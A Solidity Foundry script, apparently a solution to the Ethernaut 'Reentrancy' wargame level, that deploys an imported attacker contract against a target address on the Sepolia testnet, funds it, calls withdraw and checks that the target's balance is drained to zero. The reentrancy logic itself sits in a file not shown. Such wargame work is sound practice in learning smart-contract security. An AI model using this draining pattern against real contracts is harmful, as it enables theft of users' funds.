// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.12;

import "forge-std/Script.sol";
import "../src/Cracked10_Reentrancy.sol";

//forge script  --rpc-url sepolia --account metamask  Cracked10_ReentrancyScript --broadcast
contract Cracked10_ReentrancyScript is Script {
    address ethernaut_contracts;
    uint256 donateValue = 0.001 ether;
    Cracked10_Reentrancy ree;
    function setUp() public {
        ethernaut_contracts = vm.parseAddress(vm.envString("Reentrancy_address"));
    }

    function run() public {
        vm.startBroadcast();
        ree = new Cracked10_Reentrancy(payable(ethernaut_contracts));
        ree.attach{value: 0.001 ether}();

        ree.withdraw();
        console.log("ethernaut_contracts.balance is", ethernaut_contracts.balance);
        console.log("ree.balance is", address(ree).balance);
        require(ethernaut_contracts.balance == 0, "fail");
        vm.stopBroadcast();
    }
}
